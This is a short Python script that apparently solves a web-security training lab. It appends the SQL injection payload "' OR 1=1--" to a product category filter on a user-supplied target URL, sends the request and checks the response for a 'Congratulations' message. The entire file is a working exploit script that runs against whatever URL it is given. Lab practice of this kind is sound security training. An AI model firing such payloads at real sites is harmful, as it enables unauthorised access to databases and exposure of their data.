import requests
import sys

# Check arguments
if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <target_url>")
    sys.exit(1)

# Target URL from user input (e.g., http://example.com)
target_url = sys.argv[1].rstrip("/")

# SQLi payload
payload = "' OR 1=1--"

# Construct full URL
url = f"{target_url}/filter?category=Gifts{payload}"


# Send request
r = requests.get(url)

# Print results
print("[*] Request URL:", url)
print("[*] Status Code:", r.status_code)

# Check response
result = r.text
if "Congratulations" in result:
    print("[*] ✅ Congrats! You solved the lab, go next monster")
else:
    print("[*] ❌ Something went wrong, try again")
